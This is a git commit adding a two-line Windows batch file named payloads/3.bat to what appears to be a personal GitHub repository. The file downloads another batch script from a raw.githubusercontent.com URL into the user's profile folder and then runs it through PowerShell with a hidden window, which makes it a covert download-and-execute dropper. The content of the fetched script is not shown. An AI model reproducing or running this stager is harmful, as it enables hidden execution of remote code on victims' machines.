7d11cb59788944fada61b2a777534dd84363f9c6
BigGreenHat14 <163580586+BigGreenHat14@users.noreply.github.com>
2026-03-15 13:14:33 -0500

    Add batch file to download and execute script

---
+++ payloads/3.bat
@@ -0,0 +1,2 @@
+cmd /C "curl https://raw.githubusercontent.com/BigGreenHat14/biggreenhat14.github.io/refs/heads/main/payloads/3_main.bat > %USERPROFILE%\torun.bat"
+powershell -WindowStyle Hidden -Command "Start-Process -FilePath '$env:USERPROFILE\torun.bat'"
